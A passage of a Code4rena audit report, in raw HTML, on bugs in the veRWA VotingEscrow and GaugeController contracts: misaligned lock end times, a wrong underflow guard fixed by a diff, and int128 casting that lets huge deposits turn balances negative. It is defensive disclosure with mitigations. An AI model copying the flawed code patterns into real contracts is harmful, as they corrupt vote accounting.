href=\"https://github.com/OpenCoreCH/test-squad-verwa/blob/461b7d99a30e8fee57ba97c2262f6b0c5e4704b6/src/VotingEscrow.sol#L301-L302\">https://github.com/OpenCoreCH/test-squad-verwa/blob/461b7d99a30e8fee57ba97c2262f6b0c5e4704b6/src/VotingEscrow.sol#L301-L302</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">newLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">LOCKTIME</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/145#issuecomment-1677597116\">__141345__ (Lookout) commented</a>:</strong></p>\n<blockquote>\n<p>Locked.end will affect the delegate/undelegate requirement, such as the following check.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">VotingEscrow</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">382</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">toLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Delegatee has no lock&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">383</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">toLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Delegatee lock expired&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">384</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">toLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">fromLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Only delegate to longer lock&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/145#issuecomment-1680753041\">OpenCoreCH (veRWA) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>This was discovered during the testing contest and fixed before the audit contest, pasting my comment here for reference:</p>\n<p>Good catch, I think that would mess up the <code>_checkpoint</code> logic which implicitly assumes that the lock times are aligned, so will definitely be fixed.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/145#issuecomment-1695861935\">alcueca (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>Impact from sponsor:</p>\n<blockquote>\n<p>These slope changes would not have been applied (neither the user-specific ones, nor the global ones), resulting in wrong slopes. And if many users did this, many slopes would be messed up at some point, leading to wrong votes / relative votes.</p>\n</blockquote>\n</blockquote>\n<hr>\n<h2 id=\"m-03-replace-old_sum_bias-by-old_bias\" style=\"position:relative;\"><a href=\"#m-03-replace-old_sum_bias-by-old_bias\" aria-label=\"m 03 replace old_sum_bias by old_bias permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/140\">[M-03] Replace <code>old_sum_bias</code> by <code>old_bias</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/140\">Franfran</a></em></p>\n<p><em>Note: This audit was preceded by a <a href=\"https://code4rena.com/test-coverage\">Code4rena Test Coverage competition</a>. While auditing was not the purpose of the testing phase, relevant and valuable findings reported during that phase were eligible to be judged. This finding [M-03] was discovered during that period and is being included here for completeness.</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/GaugeController.sol b/src/GaugeController.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 68b832a..1794639 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/GaugeController.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/GaugeController.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -250,7 +250,7 @@ contract GaugeController {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 old_sum_slope = points_sum[next_time].slope;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         points_weight[_gauge_addr][next_time].bias = Math.max(old_weight_bias + new_bias, old_bias) - old_bias;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        points_sum[next_time].bias = Math.max(old_sum_bias + new_bias, old_sum_bias) - old_bias;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        points_sum[next_time].bias = Math.max(old_sum_bias + new_bias, old_bias) - old_bias;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (old_slope.end &gt; next_time) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             points_weight[_gauge_addr][next_time].slope =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 Math.max(old_weight_slope + new_slope.slope, old_slope.slope) -</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/140#issuecomment-1680746162\">OpenCoreCH (veRWA) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>This was discovered during the testing contest and fixed before the auditing contest.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/140#issuecomment-1694506064\">alcueca (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>@OpenCoreCH, since the warden didn’t really submit a report, would you be so kind as to explain the impact of this bug?</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/140#issuecomment-1695301408\">OpenCoreCH (veRWA) commented</a>:</strong></p>\n<blockquote>\n<p>The <code>Math.max</code> there is an underflow protection for <code>points_sum[next_time]</code>. This wrong implementation would have lead to an underflow in some edge cases (<code>points_sum</code> is near 0 / low, i.e. there is not a lot of voting power in the system), preventing votes for the user. Because <code>old_bias</code> decreases over time (and eventually reaches 0), the error would generally have been recoverable, but it could have taken some time.</p>\n</blockquote>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this audit, 96 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/448\">report highlighted below</a> by <strong>RED-LOTUS-REACH</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/476\">ppetrov</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/474\">nemveer</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/466\">aakansha</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/464\">Raihan</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/461\">0xkazim</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/456\">kaden</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/445\">oakcobalt</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/440\">popular00</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/432\">d23e</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/431\">ni8mare</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/428\">jat</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/422\">Eeyore</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/417\">nonseodion</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/414\">0xDetermination</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/406\">0xhacksmithh</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/404\">Shubham</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/397\">rjs</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/380\">klau5</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/372\">AlexCzm</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/363\">sandy</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/360\">Watermelon</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/358\">QiuhaoLi</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/335\">auditsea</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/320\">14si2o_Flint</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/317\">merlin</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/313\">deadrxsezzz</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/305\">Deekshith99</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/291\">immeas</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/272\">windhustler</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/259\">owadez</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/253\">supervrijdag</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/246\">KmanOfficial</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/242\">carlos__alegre</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/234\">hunter_w3b</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/217\">kutugu</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/216\">0x3b</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/214\">MatricksDeCoder</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/207\">castle_chain</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/204\">Bughunter101</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/181\">Rolezn</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/175\">0xCiphky</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/172\">0xDING99YA</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/162\">ayden</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/159\">0x4non</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/154\">MrPotatoMagic</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/146\">audityourcontracts</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/144\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/139\">Alhakista</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/107\">imkapadia</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/90\">InAllHonesty</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/80\">leasowillow</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/78\">Strausses</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/68\">HChang26</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/67\">_eperezok</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/51\">erebus</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/44\">deth</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/39\">T1MOH</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/37\">thekmj</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/14\">RHaO-sec</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/13\">kaveyjoe</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/447\">JP_Courses</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/436\">Naubit</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/434\">tay054</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/413\">wahedtalash77</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/385\">halden</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/382\">Mike_Bello90</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/377\">Tripathi</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/371\">sl1</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/351\">lanrebayode77</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/308\">0xStalin</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/285\">devival</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/274\">Bube</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/271\">p_crypt0</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/267\">0xG0P1</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/257\">markus_ether</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/243\">cducrest</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/161\">zhaojie</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/160\">0xmuxyz</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/152\">ch0bu</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/131\">0xbrett8571</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/125\">lsaudit</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/113\">SUPERMAN_I4G</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/106\">matrix_0wl</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/94\">Topmark</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/92\">Giorgio</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/89\">0xE1</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/74\">hassan-truscova</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/50\">0xweb3boy</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/42\">fatherOfBlocks</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/35\">Silverskrrrt</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/23\">0xWaitress</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/18\">koxuan</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/11\">piyushshukla</a>, <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/9\">pipidu83</a>, and <a href=\"https://github.com/code-423n4/2023-08-verwa-findings/issues/5\">hpsb</a>.</em></p>\n<h2 id=\"01-casting-between-types-makes-values-negative-for-huge-input-values\" style=\"position:relative;\"><a href=\"#01-casting-between-types-makes-values-negative-for-huge-input-values\" aria-label=\"01 casting between types makes values negative for huge input values permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[01] Casting between types makes values negative for huge input values</h2>\n<p>Invariants to the VotingEscrow contract can be broken.  While an enormous quantity is necessary, greater than the total supply of <code>$CANTO</code>, it’s worth mentioning due to the fact that invariants in the system can be broken, if only in testing environments.</p>\n<p>Invariants affected in <code>VotingEscrow.sol</code>:</p>\n<ul>\n<li>\n<p><code>LockedBalance.delegated</code> must always be > 0</p>\n<ul>\n<li>can be made negative</li>\n</ul>\n</li>\n<li>\n<p><code>LockedBalance.amount</code> must always be > 0</p>\n<ul>\n<li>can be made negative</li>\n</ul>\n</li>\n<li>\n<p><code>Point.slope</code> must always be ≥ 0</p>\n<ul>\n<li>can be made negative</li>\n</ul>\n</li>\n<li>\n<p><code>Point.bias</code> must always be ≥ 0</p>\n<ul>\n<li>can be made negative</li>\n</ul>\n</li>\n</ul>\n<p>Cases in <code>VotingEscrow.sol</code> where casting creates vulnerable attack surfaces:</p>\n<ul>\n<li>From increaseAmount in VotingLock.sol, line 317:</li>\n</ul>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L317\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L317</a> </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">newLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegated</span><span class=\"mtk1\"> += </span><span class=\"mtk11\">int128</span><span class=\"mtk1\">(</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_value</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<ul>\n<li>From increaseAmount in VotingLock.sol, line 305:</li>\n</ul>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L305\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L305</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">newLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegated</span><span class=\"mtk1\"> += </span><span class=\"mtk11\">int128</span><span class=\"mtk1\">(</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_value</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<ul>\n<li>From createLock in VotingLock.sol, line 276:</li>\n</ul>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L276\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L276</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">locked_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> += </span><span class=\"mtk11\">int128</span><span class=\"mtk1\">(</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_value</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<ul>\n<li>From createLock in VotingLock.sol, line 278:</li>\n</ul>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L278\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L278</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">locked_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegated</span><span class=\"mtk1\"> += </span><span class=\"mtk11\">int128</span><span class=\"mtk1\">(</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_value</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<ul>\n<li>From increaseAmount in VotingLock.sol, line 300:</li>\n</ul>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L300\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L300</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">newLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> += </span><span class=\"mtk11\">int128</span><span class=\"mtk1\">(</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_value</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<ul>\n<li>From increaseAmount in VotingLock.sol, line 317:</li>\n</ul>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L317\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L317</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">newLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegated</span><span class=\"mtk1\"> += </span><span class=\"mtk11\">int128</span><span class=\"mtk1\">(</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_value</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<h3 id=\"risk\" style=\"position:relative;\"><a href=\"#risk\" aria-label=\"risk permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Risk</h3>\n<p>Debugging and auditing this code is made more complex due to the inclusion of this casting, which puts the protocol more at risk than had they been unused.</p>\n<p>It’s not fully clear why the types for <code>amount</code> and <code>delegated</code>  of the <code>LockedBalance</code> struct are of type <code>int128</code>.  This could introduce unforseen edge cases due to the copious casting.  All assignments from function arguments are of type <code>uint256</code> (coming from <code>createLock()</code> and <code>increaseAmount()</code>), making the usage more peculiar and inconsistent. Similarly, <code>int128</code> is used for <code>bias</code> and <code>slope</code> of the <code>Point</code> struct, and in all places where they are used for calculations, they must be checked for being negative and are subsequently reset to <code>0</code> in the case of being negative. The suspicion is that since the origin of the <code>ve</code> system came from the original Curve contracts, the implicit assumptions of that system were kept wholesale.</p>\n<h3 id=\"mitigation\" style=\"position:relative;\"><a href=\"#mitigation\" aria-label=\"mitigation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation</h3>\n<p>Use unsigned integers for all financial calculations so that all casting is removed and remove the subsequent unnecessary “resets” to <code>0</code>. Instead, for places where the “resets” are used, define pre-conditions  that ensure negative-valued outcomes are not permissible in calls to <code>createLock()</code> and <code>increaseLock()</code>.</p>\n<h2 id=\"02-bias-and-slope-can-be-made-negative-with-huge-deposits-thus-manipulating-total-voting-power\" style=\"position:relative;\"><a href=\"#02-bias-and-slope-can-be-made-negative-with-huge-deposits-thus-manipulating-total-voting-power\" aria-label=\"02 bias and slope can be made negative with huge deposits thus manipulating total voting power permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[02] Bias and slope can be made negative with huge deposits thus manipulating total voting power</h2>\n<p>Similar to the previous “Casting between types makes values negative for huge input values”, huge inputs can allow for attacks on the protocol, if only in a testing environment.  </p>\n<p>In <code>VotingEscrow.sol</code> the code in question is from <code>_checkpoint()</code>, lines 129 - 136:</p>\n<p><a 